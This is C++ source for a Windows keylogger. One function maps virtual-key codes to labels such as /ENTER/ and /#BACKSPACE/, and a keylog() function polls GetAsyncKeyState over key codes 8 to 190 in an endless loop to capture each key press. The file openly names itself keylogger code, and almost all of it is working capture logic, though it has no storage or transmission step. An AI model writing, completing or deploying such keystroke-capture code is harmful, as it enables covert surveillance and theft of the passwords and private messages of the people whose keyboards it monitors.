#include "keylogger.h"
#include <iostream>

std::string special_keys(int S_Key) {
	std::string retVal = "";
	switch (S_Key) {
		case VK_SPACE:
			retVal += (" ");
			break;
		case VK_RETURN:
			retVal += ("/ENTER/");
			break;
		case '¾':
			retVal += (".");
			break;
		case VK_SHIFT:
			retVal += ("/#SHIFT/");
			break;
		case VK_BACK:
			retVal += ("/#BACKSPACE/");
			break;
		case VK_RBUTTON:
			retVal += ("/#RIGHTCLICK/");
			break;
		case VK_CAPITAL:
			retVal += ("/#CAPSLOCK/");
			break;
		case VK_TAB:
			retVal += ("/#TAB/");
			break;
		case VK_UP:
			retVal += ("/#UPARROW/");
			break;
		case VK_DOWN:
			retVal += ("/#DOWNARROW/");
			break;
		case VK_LEFT:
			retVal += ("/#LEFTARROW/");
			break;
		case VK_RIGHT:
			retVal += ("/#RIGHTARROW/");
			break;
		case VK_CONTROL:
			retVal += ("/#CTRL/");
			break;
		case VK_MENU:
			retVal += ("/#ALT/");
			break;
	}
	return retVal;
}

std::string keylog() {
	char KEY = 'x';

	while (true) {
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) {
				if (special_keys(KEY) == "") {
					if (KEY >= '!' && KEY <= '~') {
						std::string n;
						n += KEY;
						return n;
					}
				}
				
				return special_keys(KEY);
			}
		}
	}

}

